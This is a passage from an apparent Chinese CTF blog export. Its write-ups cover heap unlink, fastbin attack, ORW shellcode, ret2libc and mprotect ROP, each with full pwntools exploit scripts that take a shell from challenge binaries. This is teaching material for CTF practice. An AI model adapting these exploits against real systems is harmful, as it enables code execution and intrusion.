bin）再次添加2个note，payload长度为8，注意结尾不要是\\x00利用list泄露NOTE管理块的地址和libc基地址将四个note全部删除添加一个note，长度要能包含进最开始的3个note的chunk伪造一个chunk，大小为0x80，fd为note[0]-0x18， bk为note[0]-0x10，利用unlink把NOTE管理块中note[0]的地址改为note[0]-0x18把note[0]改为atoi的got，然后编辑note[0]，改为system地址输入/bin/sh，获取shell 先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;在heap基地址偏移0x30的地方有我们需要的NOTE管理块的地址 0x03 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p=process('./freenote_x64')# p=remote('node4.buuoj.cn',28735)libc=ELF('libc-2.23.so')e=ELF('./freenote_x64')def List(): p.recvuntil('Your choice: ') p.sendline('1')def new(cont): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def edit(num,cont): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Note number: ') p.sendline(str(num)) p.recvuntil('Length of note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def delete(num): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(num))new('a'*0x80)new('b'*0x80)new('c'*0x80)new('d'*0x80)delete(0)delete(2)new('11111111')new('22222222')List()p.recvuntil('11111111')s=p.recvuntil('\\x0a')chunk2=u64(s[:-1].ljust(8,'\\x00'))heap_addr=chunk2-0x1940point_chunk0=heap_addr+0x30print hex(heap_addr)delete(1)delete(2)delete(3)#unlinkpayload = p64(0x90)+p64(0x81)+p64(point_chunk0-0x18)+p64(point_chunk0-0x10) payload +='a'*0x60payload += p64(0x80)+p64(0x90)payload +='c'*0x80+p64(0x90)+p64(0x121)edit(0,payload)delete(1)#free_got-&gt;systemfree_got_addr=e.got['free']print hex(free_got_addr)payload2=p64(4)+p64(1)+p64(0x8)+p64(free_got_addr)payload2+=p64(1)+p64(0x8)+p64(chunk2)payload2+=p64(1)+p64(0x8)+p64(e.got['atoi'])payload2+='\\x00'*(0x120-80)edit(0,payload2)p.recvuntil('Your choice: Invalid!\\n')List()p.recvuntil('2. ')atoi_in_server=u64(p.recvuntil('\\x0a')[:-1].ljust(8,'\\x00'))system_in_server=libc.symbols['system']+atoi_in_server-libc.symbols['atoi']#gdb.attach(proc.pidof(p)[0])payload3=p64(system_in_server)edit(0,payload3)edit(1,&quot;/bin/sh\\x00&quot;)delete(1)p.interactive() 0x04 参考文章https://blog.csdn.net/weixin_45427676/article/details/105495608 https://www.cnblogs.com/LynneHuan/p/14869403.html","link":"/2022/01/13/jarvisoj_level6_x64/"},{"title":"hitcontraining_unlink","text":"ulink hitcontraining_unlink程序分析检查：64位程序，开了NX和canary 存在magic函数（实际上并没什么用） 查看主函数及各菜单功能 show() add() change() 在change_item()函数中并没有对输入的内容size进行检查，存在堆溢出 remove() 思路unlink基本知识 新版unlink要求 // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (“corrupted size vs. prev_size”); \\ // 检查 fd 和 bk 指针(双向链表完整性检查)if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); \\ // largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, “corrupted double-linked list (not small)”, P, AV); 利用思路： 构造fake_chunk 通过unlink，把 chunk 移到存储 chunk 指针的内存处 覆盖 chunk 0 指针为 atoi@got 表地址并泄露 覆盖 atoi 的 got 表为 system 函数地址。 给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *context.log_level = 'debug'r = remote('node4.buuoj.cn',27663)# r=process('./bamboobox')elf = ELF('./bamboobox')libc = ELF('./libc-2.23.so')def add(length,name): r.recvuntil(&quot;:&quot;) r.sendline('2') r.recvuntil(':') r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name) def edit(idx,length,name): r.recvuntil(':') r.sendline('3') r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(':') r.sendline(name) def delete(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)add(0x40,'aaaaaaaa')add(0x80,'bbbbbbbb')add(0x80,'cccccccc')#gdb.attach(r)ptr = 0x6020C8 #存放chunk指针的数组在bss段上的地址#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)fake_chunk = p64(0) + p64(0x41) #fake_chunk headerfake_chunk += p64(ptr-0x18) + p64(ptr-0x10) #fake_chunk fd bkfake_chunk += 'C'*0x20fake_chunk += p64(0x40) # 1的presize fake_chunk += p64(0x90) # 1的sizeedit(0,0x80,fake_chunk)delete(1) #前向合并，合并0中的fake_chunk 放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18payload = p64(0) * 2payload += p64(0x40) + p64(elf.got['atoi']) #覆盖的itemlist[0]-&gt;ptr 为atoi_gotedit(0,0x80,payload)show()r.recvuntil('0 : ')atoi = u64(r.recv(6).ljust(8,'\\x00'))libc_base = atoi - libc.symbols['atoi']system = libc_base + libc.symbols['system']edit(0,8,p64(system))r.sendlineafter('Your choice:','/bin/sh\\x00')r.interactive() 参考文章https://blog.csdn.net/mcmuyanga/article/details/113105091","link":"/2022/01/19/hitcontraining_unlink/"},{"title":"pwnable.tw orw","text":"prctl内核沙箱机制 知识点prctl seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时过滤掉某些syscall，只允许使用部分syscall。 seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。 WP 开启了canary 本题系统内核只允许使用sys_open，sys_read，sys_write 第一次调用prctl函数 禁止提权,第二次调用prctl函数 限制能执行的系统调用只有open，write，exit 总体思路是：open flag -&gt;read-&gt;write sys_open 1234567push 0x0 #字符串结尾push 0x67616c66 #'flags'mov ebx,esp xor ecx,ecx #0xor edx,edx #0mov eax,0x5 #调用号int 0x80 #sys_open(flags,0,0) sys_read(2,file,0x100) 系统调用号为3 123456mov eax,0x3; mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”mov ebx,0x3; # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件mov edx,0x100; #对应字节数int 0x80; sys_write(1,file,0x30) 系统调用号为4 123mov eax,0x4; # eax = sys_writemov ebx,0x1; # ebx = unsigned int fd = 1int 0x80; exp: 1234567891011from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')p=remote('node4.buuoj.cn',28836)shellcode=&quot;&quot;shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;')shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')shellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')recv = p.recvuntil(':')p.sendline(shellcode)flag = p.recv(100)print flag 12345678910111213141516from pwn import *r = remote('node4.buuoj.cn',28836)context.log_level = 'debug'elf = ELF('orw')shellcode = shellcraft.open('/flag')shellcode += shellcraft.read('eax','esp',100)shellcode += shellcraft.write(1,'esp',100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()","link":"/2021/11/17/pwnable.tw_orw/"},{"title":"babyheap_0ctf_2017","text":"堆溢出 malloc_chunk的结构参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据当前一个chunk的状态是空闲时记录大小（也就是被free的时候），当前一个chunk的状态不是空闲的时候，记录它的数据。然后是 size： 就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西分别是non_main_arena :记录当前chunk是否属于主线程is_mapped：当前chunk是否由mmap分配prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址） fd,bk: 表示用户数据，或者表示地址chunk非空闲时，fd和bk存在的地方表示的是用户的数据，chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。 chunk的结构 第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数第三个就是存储数据的部分然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。 chunk被free后结构变化： 第一行,没变化，因为它是chunk1第二行开始，M的位置变成了0，代表着chunk不是由mmap分配第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。） chunk的空间复用： bin及分类 fast bins small binslarge binsunsorted bins未被分类，刚被free未真的进入bin Top Chunk babyheap_0ctf_2017考点： fastbin attack 利用思路两次 double free 与 fastbin attack 。第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 利用过程1、通过unsortedbin attack 来泄露libc地址 首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，能读出fd 或者 bk的值 我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"unlink","text":"堆溢出漏洞——unlink 推荐unlink基本知识讲解 2014 HITCON stkofexp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = &quot;./stkof&quot;hollkelf = ELF('./stkof')if args['REMOTE']: hollk = remote('127.0.0.1', 7777)else: hollk = process(&quot;./stkof&quot;)log.info('PID: ' + str(proc.pidof(hollk)[0]))libc = ELF('./libc.so.6')head = 0x602140def alloc(size): hollk.sendline('1') hollk.sendline(str(size)) hollk.recvuntil('OK\\n')def edit(idx, size, content): hollk.sendline('2') hollk.sendline(str(idx)) hollk.sendline(str(size)) hollk.send(content) hollk.recvuntil('OK\\n')def free(idx): hollk.sendline('3') hollk.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head - 0x8) #fd payload += p64(head) #bk payload += p64(0x20) # next chunk's prev_size bypass the check payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) hollk.recvuntil('OK\\n') #gdb.attach(hollk) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64(hollkelf.got['free']) + p64(hollkelf.got['puts']) + p64( hollkelf.got['atoi']) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(hollkelf.plt['puts']) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = hollk.recvuntil('\\nOK\\n', drop=True).ljust(8, '\\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] binsh_addr = libc_base + next(libc.search('/bin/sh')) system_addr = libc_base + libc.symbols['system'] log.success('libc base: ' + hex(libc_base)) log.success('/bin/sh addr: ' + hex(binsh_addr)) log.success('system addr: ' + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) hollk.send(p64(binsh_addr)) hollk.interactive() if __name__ == &quot;__main__&quot;: exp() axb_2019_heap知识点 pwndbg使用regs查看寄存器里得值 利用思路 利用格式化字符串泄露libc和程序基址 运用unlink将chunk 0 地址覆写为free_hook的地址 将system地址写入free_hook 触发写入的’/bin/sh’块的删除，执行system(‘/bin/sh’) WP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *#p = remote(&quot;node3.buuoj.cn&quot;,26144)p = process(&quot;./axb_2019_heap&quot;)context.log_level = 'debug'elf = ELF(&quot;./axb_2019_heap&quot;)libc = ELF('./libc-2.23-64.so')def add(idx,size,content): p.sendlineafter('&gt;&gt;','1') p.sendlineafter('):',str(idx)) p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content) def delete(idx): p.sendlineafter('&gt;&gt;','2') p.sendlineafter('index:',str(idx)) def edit(idx,content): p.sendlineafter('&gt;&gt;','4') p.sendlineafter('index:',str(idx)) p.sendlineafter('content: \\n',content) def show(): p.sendlineafter('&gt;&gt;','3')p.recvuntil('name: ')p.sendline('%11$p%15$p')p.recvuntil('Hello, ')base=int(p.recv(14),16)-0x1186#success(&quot;base:&quot;+hex(base))libcbase=int(p.recv(14),16)-libc.sym['__libc_start_main']-240system=libcbase+libc.sym['system']free_hook=libcbase+libc.sym['__free_hook']bss=base+0x202060success(&quot;bss:&quot;+hex(bss))add(0,0x98,'aaaa')#0add(1,0x98,'bbbb')#1add(2,0x90,'cccc')#2add(3,0x90,'/bin/sh\\x00')#3 #gdb.attach(p) payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+'\\xa0'edit(0,payload)#gdb.attach(p)delete(1)edit(0,p64(0)*3+p64(free_hook)+p64(0x10))#gdb.attach(p)edit(0,p64(system))#gdb.attach(p)delete(3) p.interactive()","link":"/2021/11/25/unlink/"},{"title":"栈溢出","text":"ret2libc，fmtstr 一. 基础知识补充 指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP(Instruction Pointer)分别为64位、32位、16位指令指针寄存器 以64位程序为例: 在执行call指令的时候，会向栈中压入call指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行 push rbp ;将父函数栈底压入栈中mov rbp, rsp ;将父函数栈顶变为子函数栈底sub rsp, 0x70 ;向低地址处为子函数开辟栈帧 在函数调用结束的时候，程序会执行这两条指令leave指令相当于执行了如下两条指令mov esp ebppop ebp ret指令则可以理解为将栈中的返回地址pop给rip的操作，从而回到父函数继续执行 二. ret2text栈溢出函数：strcpy 程序本身存在fflush函数，我们可以直接用它的sh来当作system的参数 三. ret2libc泄露libc利用思路： 利用write函数来泄露程序的libc版本 知道libc版本后去计算程序里的system函数和字符串“/bin/sh”的地址 覆盖返回地址为system（‘/bin/sh’），获取shell 例题：2018_rop 1: 12345payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4)) # 获取write函数地址libc=LibcSearcher('write',write_addr) 首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用write函数，之后跟上main函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造rop）p32（0）+p32(write_addr)+p32(4)是在设置write函数的参数，对应函数原型看一下，32位程序是4位，所以这边写的4，对应的64位程序是8位。 2: 1234offset=write_addr-libc.dump('write') #计算偏移量 #偏移量=程序里的函数地址-libc里的函数地址system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh') 3: 构造rop获取shell 1payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh) 完整exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',27043)elf=ELF('./2018_rop')write_plt=elf.plt['write']write_got=elf.got['write']main=elf.sym['main']payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4))libc=LibcSearcher('write',write_addr)offset=write_addr-libc.dump('write')system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh')payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)r.sendline(payload)r.interactive() 但是我在这么写的时候出现了 timeout: the monitored command dumped core,尝试泄露read函数的真实地址，再调用read函数来找到偏移。(后来找到问题有：payload的顺序错误也会导致timeout和找不到libc,timeout对应payload:填充+got表+plt表+main，找不到libc对应payload:填充+pop_rdi_ret+binsh_system,对应64位栈溢出，32位和64位不同) 64位查找pop_rdi: 1ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot; exp: 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *elf = ELF(&quot;./2018_rop&quot;)p = remote(&quot;node3.buuoj.cn&quot;,28628)read_plt = elf.plt['read']read_got = elf.got['read']write_plt = elf.plt['write']main_addr = 0x080484C6payload = 'a' * (0x88 + 0x4) payload += p32(write_plt) + p32(main_addr)payload += p32(1) + p32(read_got) + p32(8)p.sendline(payload)read_addr = u32(p.recv(4))print hex(read_addr)libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = 'a' * (0x88 + 0x4)payload += p32(sys_addr) + p32(0) + p32(binsh)p.sendline(payload)p.interactive() LibcSearcher使用方法：将exp放在libcsearcher的安装目录下 12345678910111213141516171819202122232425# coding:utf-8from pwn import*from LibcSearcher import*p=remote('node3.buuoj.cn','25295')elf=ELF('./1')main=0x400b28rdi=0x400c83ret=0x4006b9pus_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('Input your choice!\\n','1')payload='\\0'+'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter('Input your Plaintext to be encrypted\\n',payload)p.recvline()p.recvline() #接收 encrypt 的两个 puts函数输出;puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #得到 puts 函数 的地址;libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到偏移地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址p.sendlineafter('choice!\\n','1') # 再一次执行 一遍流程payload='\\0'+'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() plt表-》got表 四. 利用mprotect修改内存权限mprotect函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。 ROPgadget使用例题：not_the_same_3dsctf_2016 利用mprotect函数修改bss段为0x7即0b111，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置 1ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop 需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8 ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr=0x80eb000 将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入shellcode 12345678910111213141516171819202122232425# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行int mprotect(const void *start, size_t len, int prot);argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)elf = ELF('./pwn')# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep poppop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; retpayload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个poppayload += p32(argu1) + p32(argu2) + p32(argu3)# 紧接着返回地址为 read对修改的目标地址写入shellcodepayload += p32(elf.symbols['read']) payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址payload += p32(0) + p32(argu1) + p32(0x100)# read写完后 写入执行的目标地址payload += p32(argu1)# 先进行sendline执行到read等待输入sh.sendline(payload)# 继续sendline发送shellcodesh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))# 进入交互模式sh.interactive() 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8from pwn import*context.log_level = 'debug'context(arch='i386', os='linux')local = 0proc_name = './not_the_same_3dsctf_2016'elf = ELF(proc_name)# 这道题本地和远程两种解法，真的干。。。if local: sh = process(proc_name) str_flag_addr = 0x080ECA2D backdoor_addr = 0x080489A0 printf_addr = 0x0804F0A0 payload = 0x2D * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp payload += p32(backdoor_addr) + p32(printf_addr) payload += p32(str_flag_addr) sh.sendline(payload)else: sh = remote('node3.buuoj.cn', 28308) mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] pop3_edi_esi_ebx_ret = 0x0806fcc8 mem_addr = 0x080EB000 #.got.plt 的起始地址 mem_size = 0x1000 mem_type = 0x7 # 可执行权限 payload = 0x2D * 'a' payload += p32(mprotect_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) payload += p32(read_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(0) + p32(mem_addr) + p32(0x100) payload += p32(mem_addr) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode sh.sendline(payload) # read写入shellcode payload = asm(shellcraft.sh()) sh.sendline(payload)sh.interactive() 五. 32位，64位栈溢出对比32位的函数在调用栈的时候是： 调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1 由于在函数调用前通过push指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp。 64位的函数在调用栈的时候是： 前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。 参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址 六. 覆盖相关变量 ebp ret_addr 虚函数指针 ​ 子类对父类的继承​ 能够对函数进行重写​ 由虚函数表来进行操作 SEH链 ​ SEH结构 结构 在栈中存在的 地方 ，在 在ret_addr和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对SEH链的攻击 Hook中的变量 利用方法介绍 有些系统函数有预先定义好的钩子 修改钩子链表中存储的子程序指针影响钩子运行 fgets的用法的时候，发现它能够避免造成溢出 程序自带的system函数地址 timeout: the monitored command dumped core解决 1)在payload后面加几个ret地址，或者加一个假的0xdeadbeef 1p = flat(['a'*0x10, 'b'*8, pop_di, bin_sh_addr, system, 0xdeadbeef]) 2)直接用系统函数的地址 七. BUUCTF 例题1. JarvisOJ level4知识点参考文章：借助DynELF实现无libc的漏洞利用小结 pwntools中DynELF函数使用(针对未给出libc文件) 123456789def leak(address): payload=pad+p32(writeplt)+ret1+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) #print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex')) 这里是测试用，可省略。 return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;对应文件&quot;))sysaddr=d.lookup(&quot;system&quot;,&quot;libc&quot;) pad为填充，ret1为有效的返回地址 WP 开了NX保护（堆栈不可执行） 利用DynELF泄露system地址，通过read函数写入/bin/sh到bss段 exp: 123456789101112131415161718192021222324from pwn import *conn=process('./level4')e=ELF('./level4')pad=0x88write_plt=e.plt['write']vul_addr=0x804844bbss_addr=0x0804a024def leak(address): payload1='a'*0x8c+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4) conn.sendline(payload1) data=conn.recv(4) return data d=DynELF(leak,elf=e)system_addr=d.lookup('system','libc')print hex(system_addr)read_plt=e.plt['read']payload2='a'*0x8c+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)conn.sendline(payload2)conn.send(&quot;/bin/sh&quot;)payload3=&quot;a&quot;*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)conn.sendline(payload3)conn.interactive() 常规解法: 123456789101112131415161718192021222324252627282930#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25934)elf = ELF(&quot;./level4&quot;)read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; * 0x8c + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendline(payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 0x8c + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendline(payload)p.interactive() jarvisoj_level3_x6464位ret2libc（no canary found) checksec 泄露libc 64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。我们这边要利用write函数去泄露libc版本write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参 123456ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 